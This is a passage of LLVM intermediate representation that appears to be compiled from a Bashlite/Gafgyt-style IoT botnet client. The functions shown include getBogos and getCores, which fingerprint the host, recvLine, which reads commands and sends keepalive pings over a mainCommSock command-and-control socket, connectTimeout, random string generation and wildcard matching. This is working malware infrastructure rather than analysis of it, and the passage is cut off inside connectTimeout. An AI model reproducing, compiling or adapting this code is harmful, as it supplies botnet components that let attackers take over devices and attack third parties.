  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  store i32 0, i32* %48, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %43
  br label %56

52:                                               ; preds = %43
  %53 = load i32, i32* %7, align 4
  %54 = and i32 %53, 65280
  %55 = ashr i32 %54, 8
  br label %56

56:                                               ; preds = %52, %51
  %57 = phi i32 [ -1, %51 ], [ %55, %52 ]
  store i32 %57, i32* %2, align 4
  br label %58

58:                                               ; preds = %56, %18
  %59 = load i32, i32* %2, align 4
  ret i32 %59
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #3

declare i32 @waitpid(i32, i32*, i32) #5

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9, !llvm.loop !15

37:                                               ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %37
  br label %43

41:                                               ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

43:                                               ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i64 @parseHex(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

4:                                                ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

9:                                                ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

12:                                               ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

14:                                               ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4, !llvm.loop !16

24:                                               ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @wildString(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

9:                                                ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

13:                                               ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

19:                                               ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

24:                                               ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

31:                                               ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

33:                                               ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

37:                                               ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

42:                                               ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

50:                                               ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

54:                                               ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #11
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #11
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

64:                                               ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

72:                                               ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

76:                                               ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly willreturn
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getHost(i8* %0, %struct.in_addr* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #12
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @uppercase(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

3:                                                ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

7:                                                ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #11
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3, !llvm.loop !17

16:                                               ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getBogos(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i64 0, i64 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

8:                                                ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

13:                                               ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0)) #11
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

19:                                               ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

22:                                               ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

27:                                               ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

32:                                               ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

37:                                               ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

39:                                               ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22, !llvm.loop !18

42:                                               ; preds = %37
  br label %43

43:                                               ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #11
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

52:                                               ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* %54) #11
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

61:                                               ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

63:                                               ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #11
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43, !llvm.loop !19

69:                                               ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* %70, i32 46) #11
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

73:                                               ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* %74, i32 46) #11
  store i8 0, i8* %75, align 1
  br label %76

76:                                               ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* %77, i8* %78) #12
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %2, align 4
  br label %87

82:                                               ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %83, i8 0, i64 4096, i1 false)
  br label %8, !llvm.loop !20

84:                                               ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 %85)
  store i32 1, i32* %2, align 4
  br label %87

87:                                               ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly willreturn
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i64 0, i64 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

5:                                                ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

10:                                               ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0)) #11
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

16:                                               ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

19:                                               ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %20, i8 0, i64 4096, i1 false)
  br label %5, !llvm.loop !21

21:                                               ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeRandomStr(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !22

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @recvLine(i32 %0, i8* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.fd_set*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.fd_set*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %19, i8 0, i64 %21, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

24:                                               ; preds = %3
  store %struct.fd_set* %8, %struct.fd_set** %11, align 8
  store i32 0, i32* %10, align 4
  br label %25

25:                                               ; preds = %35, %24
  %26 = load i32, i32* %10, align 4
  %27 = zext i32 %26 to i64
  %28 = icmp ult i64 %27, 16
  br i1 %28, label %29, label %38

29:                                               ; preds = %25
  %30 = load %struct.fd_set*, %struct.fd_set** %11, align 8
  %31 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %32 = load i32, i32* %10, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %31, i64 0, i64 %33
  store i64 0, i64* %34, align 8
  br label %35

35:                                               ; preds = %29
  %36 = load i32, i32* %10, align 4
  %37 = add i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %25, !llvm.loop !23

38:                                               ; preds = %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = srem i32 %40, 64
  %42 = zext i32 %41 to i64
  %43 = shl i64 1, %42
  %44 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %45 = load i32, i32* %5, align 4
  %46 = sdiv i32 %45, 64
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [16 x i64], [16 x i64]* %44, i64 0, i64 %47
  %49 = load i64, i64* %48, align 8
  %50 = or i64 %49, %43
  store i64 %50, i64* %48, align 8
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, 1
  %53 = call i32 @select(i32 %52, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %53, i32* %12, align 4
  %54 = icmp sle i32 %53, 0
  br i1 %54, label %55, label %100

55:                                               ; preds = %39
  br label %56

56:                                               ; preds = %95, %55
  %57 = load i32, i32* %13, align 4
  %58 = icmp slt i32 %57, 10
  br i1 %58, label %59, label %99

59:                                               ; preds = %56
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i64 0, i64 0))
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

64:                                               ; preds = %59
  store %struct.fd_set* %8, %struct.fd_set** %15, align 8
  store i32 0, i32* %14, align 4
  br label %65

65:                                               ; preds = %75, %64
  %66 = load i32, i32* %14, align 4
  %67 = zext i32 %66 to i64
  %68 = icmp ult i64 %67, 16
  br i1 %68, label %69, label %78

69:                                               ; preds = %65
  %70 = load %struct.fd_set*, %struct.fd_set** %15, align 8
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %70, i32 0, i32 0
  %72 = load i32, i32* %14, align 4
  %73 = zext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %73
  store i64 0, i64* %74, align 8
  br label %75

75:                                               ; preds = %69
  %76 = load i32, i32* %14, align 4
  %77 = add i32 %76, 1
  store i32 %77, i32* %14, align 4
  br label %65, !llvm.loop !24

78:                                               ; preds = %65
  br label %79

79:                                               ; preds = %78
  %80 = load i32, i32* %5, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %85 = load i32, i32* %5, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %5, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %79
  %96 = load i32, i32* %13, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %13, align 4
  br label %56, !llvm.loop !25

98:                                               ; preds = %79
  br label %99

99:                                               ; preds = %98, %56
  br label %100

100:                                              ; preds = %99, %39
  store i32 0, i32* %18, align 4
  %101 = load i8*, i8** %6, align 8
  store i8* %101, i8** %17, align 8
  br label %102

102:                                              ; preds = %120, %100
  %103 = load i32, i32* %7, align 4
  %104 = add nsw i32 %103, -1
  store i32 %104, i32* %7, align 4
  %105 = icmp sgt i32 %103, 1
  br i1 %105, label %106, label %123

106:                                              ; preds = %102
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i64 @recv(i32 %107, i8* %16, i64 1, i32 0)
  %109 = icmp ne i64 %108, 1
  br i1 %109, label %110, label %112

110:                                              ; preds = %106
  %111 = load i8*, i8** %17, align 8
  store i8 0, i8* %111, align 1
  store i32 -1, i32* %4, align 4
  br label %126

112:                                              ; preds = %106
  %113 = load i8, i8* %16, align 1
  %114 = load i8*, i8** %17, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %17, align 8
  store i8 %113, i8* %114, align 1
  %116 = load i8, i8* %16, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 10
  br i1 %118, label %119, label %120

119:                                              ; preds = %112
  br label %123

120:                                              ; preds = %112
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %18, align 4
  br label %102, !llvm.loop !26

123:                                              ; preds = %119, %102
  %124 = load i8*, i8** %17, align 8
  store i8 0, i8* %124, align 1
  %125 = load i32, i32* %18, align 4
  store i32 %125, i32* %4, align 4
  br label %126

126:                                              ; preds = %123, %110
  %127 = load i32, i32* %4, align 4
  ret i32 %127
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connectTimeout(i32 %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set*, align 8
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #15
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %4
  store i32 0, i32* %5, align 4
  br label %106

37:                                               ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %39, i8 0, i64 8, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %97

45:                                               ; preds = %37
  %46 = call i32* @__errno_location() #15
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %95

49:                                               ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

54:                                               ; preds = %49
  store %struct.fd_set* %11, %struct.fd_set** %18, align 8
  store i32 0, i32* %17, align 4
  br label %55

55:                                               ; preds = %65, %54
  %56 = load i32, i32* %17, align 4
  %57 = zext i32 %56 to i64
  %58 = icmp ult i64 %57, 16
  br i1 %58, label %59, label %68

59:                                               ; preds = %55
  %60 = load %struct.fd_set*, %struct.fd_set** %18, align 8
  %61 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %60, i32 0, i32 0
  %62 = load i32, i32* %17, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 %63
  store i64 0, i64* %64, align 8
  br label %65

65:                                               ; preds = %59
  %66 = load i32, i32* %17, align 4
  %67 = add i32 %66, 1
  store i32 %67, i32* %17, align 4
  br label %55, !llvm.loop !27

68:                                               ; preds = %55
  br label %69

69:                                               ; preds = %68
  %70 = load i32, i32* %6, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %75 = load i32, i32* %6, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
